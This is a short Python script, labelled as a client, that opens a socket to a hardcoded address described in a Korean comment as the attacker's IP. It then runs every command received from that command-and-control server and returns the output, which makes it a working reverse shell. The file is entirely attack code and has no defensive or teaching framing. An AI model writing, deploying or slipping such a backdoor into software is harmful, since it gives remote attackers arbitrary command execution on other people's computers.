# client
import socket
import os
import subprocess


def set_sock(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    s.connect((ip, port))
    return s

def connect_cnc(s):
    while True:
        try:
            cmd = s.recv(65535).decode().lower()
            if cmd == "exit":
                s.close()
                break
            proc = subprocess.Popen([str(cmd)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            p = proc.communicate()
            s.send(str(p).encode("euc-kr", "ignore"))
        except Exception as ex:
            s.send(str(ex).encode("euc-kr", "ignore"))


if __name__ == "__main__":
    ip = "172.30.1.40"  # 연결할 공격자의 아이피 주소
    port = 1    # 접속 에러시 포트 바꿔가며 실행
    s = set_sock(ip, port)
    connect_cnc(s)
